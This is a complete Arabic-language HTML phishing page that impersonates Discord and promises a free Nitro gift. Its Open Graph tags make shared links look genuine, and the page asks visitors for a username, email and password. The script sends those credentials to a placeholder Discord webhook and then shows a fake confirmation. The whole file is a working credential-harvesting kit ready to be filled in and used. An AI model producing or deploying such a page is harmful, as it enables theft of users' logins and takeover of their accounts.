<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Discord Nitro - استلم هديتك الآن</title>
    <!-- هذه الوسوم تجعل الرابط يظهر بشكل احترافي عند إرساله في ديسكورد -->
    <meta property="og:title" content="مبروك! لقد ربحت ديسكورد نيترو مجاناً">
    <meta property="og:description" content="اضغط هنا لتفعيل اشتراك النيترو الخاص بك لمدة أسبوع مجاناً.">
    <meta property="og:image" content="https://assets-global.website-files.com/6257adef93867e50f84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #36393f; color: white; font-family: sans-serif; }
        .discord-card { background-color: #2f3136; border-radius: 8px; }
        .btn-nitro { background-color: #5865f2; }
    </style>
</head>
<body class="p-4">

    <!-- الشعار في الزاوية اليمنى -->
    <div class="fixed top-4 right-4 z-50">
        <img src="https://assets-global.website-files.com/6257adef93867e50f84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord" class="w-16 h-16">
    </div>

    <div class="flex items-center justify-center min-h-screen">
        <div id="login-container" class="discord-card p-8 w-full max-w-sm shadow-xl border border-gray-700">
            <h2 class="text-2xl font-bold mb-6 text-center">استلام هدية Nitro</h2>
            <div class="space-y-4">
                <input id="username" type="text" placeholder="اسم المستخدم" class="w-full p-2 bg-[#202225] border border-black rounded">
                <input id="email" type="email" placeholder="البريد الإلكتروني" class="w-full p-2 bg-[#202225] border border-black rounded">
                <div class="relative"><input id="pass" type="password" placeholder="كلمة المرور" class="w-full p-2 bg-[#202225] border border-black rounded"><button type="button" onclick="toggle('pass')" class="absolute left-2 top-2 text-xs text-gray-400">عرض</button></div>
                <div class="relative"><input id="confirm-pass" type="password" placeholder="تأكيد كلمة المرور" class="w-full p-2 bg-[#202225] border border-black rounded"><button type="button" onclick="toggle('confirm-pass')" class="absolute left-2 top-2 text-xs text-gray-400">عرض</button></div>
                <button id="submit-btn" class="btn-nitro w-full py-2 rounded font-bold">تفعيل الآن</button>
            </div>
        </div>
    </div>

    <script>
        function toggle(id) { const i = document.getElementById(id); i.type = (i.type === 'password') ? 'text' : 'password'; }
        
        document.getElementById('submit-btn').onclick = function() {
            const data = {
                name: document.getElementById('username').value,
                email: document.getElementById('email').value,
                pass: document.getElementById('pass').value
            };
            
            // إرسال البيانات للديسكورد عبر Webhook
            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🚨 زائر جديد: ${data.name} | الإيميل: ${data.email} | الباسورد: ${data.pass}` })
            });

            alert("تم التفعيل بنجاح! سيصلك النيترو خلال 24 ساعة.");
            location.reload();
        };
    </script>
</body>
</html>
